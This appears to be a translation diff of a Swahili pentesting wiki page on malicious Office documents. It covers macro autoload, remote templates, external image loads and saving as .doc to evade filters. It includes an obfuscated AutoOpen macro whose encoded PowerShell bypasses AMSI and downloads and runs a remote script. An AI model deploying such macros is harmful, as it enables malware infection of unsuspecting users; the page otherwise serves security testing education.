@@ -4,37 +4,37 @@
 
 ## Office Documents
 
-Microsoft Word hufanya uthibitisho wa data za faili kabla ya kufungua faili. Uthibitisho wa data hufanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Ikiwa kosa lolote litajitokeza wakati wa utambuzi wa muundo wa data, faili inayochambuliwa haitafunguliwa.
+Microsoft Word hufanya uthibitisho wa data za faili kabla ya kufungua faili. Uthibitisho wa data unafanywa kwa njia ya utambuzi wa muundo wa data, dhidi ya kiwango cha OfficeOpenXML. Ikiwa hitilafu yoyote itatokea wakati wa utambuzi wa muundo wa data, faili inayochambuliwa haitafunguliwa.
 
-Kwa kawaida, faili za Word zinazokuwa na macros hutumia kiendelezi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiendelezi cha faili na bado kuhifadhi uwezo wao wa kutekeleza macros.\
+Kwa kawaida, faili za Word zinazokuwa na macros hutumia kiambishi cha `.docm`. Hata hivyo, inawezekana kubadilisha jina la faili kwa kubadilisha kiambishi cha faili na bado kuhifadhi uwezo wao wa kutekeleza macros.\
 Kwa mfano, faili ya RTF haisaidii macros, kwa muundo, lakini faili ya DOCM iliyobadilishwa kuwa RTF itashughulikiwa na Microsoft Word na itakuwa na uwezo wa kutekeleza macros.\
-Mifumo na mitambo ile ile inatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).
+Mifumo na mitambo sawa inatumika kwa programu zote za Microsoft Office Suite (Excel, PowerPoint n.k.).
 
-Unaweza kutumia amri ifuatayo kuangalia ni viendelezi gani vitakavyotekelezwa na baadhi ya programu za Office:
+Unaweza kutumia amri ifuatayo kuangalia ni kiambishi gani kitakachotekelezwa na baadhi ya programu za Office:
 ```bash
 assoc | findstr /i "word excel powerp"
 ```
-DOCX files referencing a remote template (File –Options –Add-ins –Manage: Templates –Go) that includes macros can “execute” macros as well.
+DOCX faili zinazorejelea templeti ya mbali (File –Options –Add-ins –Manage: Templates –Go) ambayo inajumuisha macros zinaweza "kutekeleza" macros pia.
 
-### External Image Load
+### Upakuaji wa Picha za Nje
 
-Go to: _Insert --> Quick Parts --> Field_\
-_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or URL**:_ http://\<ip>/whatever
+Nenda kwa: _Insert --> Quick Parts --> Field_\
+_**Categories**: Links and References, **Filed names**: includePicture, na **Filename or URL**:_ http://\<ip>/whatever
 
 ![](<../../images/image (155).png>)
 
-### Macros Backdoor
+### Backdoor za Macros
 
-Ni rahisi kutumia macros kuendesha msimbo wowote kutoka kwa hati.
+Inawezekana kutumia macros kuendesha msimbo wowote kutoka kwa hati.
 
-#### Autoload functions
+#### Kazi za Autoload
 
 Kadri zinavyokuwa za kawaida, ndivyo uwezekano wa AV kuzitambua unavyoongezeka.
 
 - AutoOpen()
 - Document_Open()
 
-#### Macros Code Examples
+#### Mifano ya Msimbo wa Macros
 ```vba
 Sub AutoOpen()
 CreateObject("WScript.Shell").Exec ("powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=")
@@ -71,7 +71,7 @@ Nenda kwenye **File > Info > Inspect Document > Inspect Document**, ambayo itafu
 #### Upanuzi wa Doc
 
 Unapomaliza, chagua **Save as type** dropdown, badilisha muundo kutoka **`.docx`** hadi **Word 97-2003 `.doc`**.\
-Fanya hivi kwa sababu huwezi **kuhifadhi macro ndani ya `.docx`** na kuna **stigma** **kuhusu** upanuzi wa macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya lango la wavuti/barua pepe yanayazuia kabisa). Kwa hivyo, huu **upanuzi wa zamani `.doc` ni suluhisho bora**.
+Fanya hivi kwa sababu huwezi **kuhifadhi macro ndani ya `.docx`** na kuna **stigma** **kuhusu** upanuzi wa macro-enabled **`.docm`** (kwa mfano, ikoni ya thumbnail ina `!` kubwa na baadhi ya lango la wavuti/barua pepe linaweza kuzuia kabisa). Hivyo, upanuzi huu wa zamani wa `.doc` ni **mkataba bora**.
 
 #### Watengenezaji wa Macros Mbaya
 
@@ -144,9 +144,11 @@ Kuna njia kadhaa za **kulazimisha uthibitisho wa NTLM "kijijini"**, kwa mfano, u
 
 **Angalia mawazo haya na mengine kwenye kurasa zifuatazo:**
 
+
 {{#ref}}
 ../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md
 {{#endref}}
+
 
 {{#ref}}
 ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md
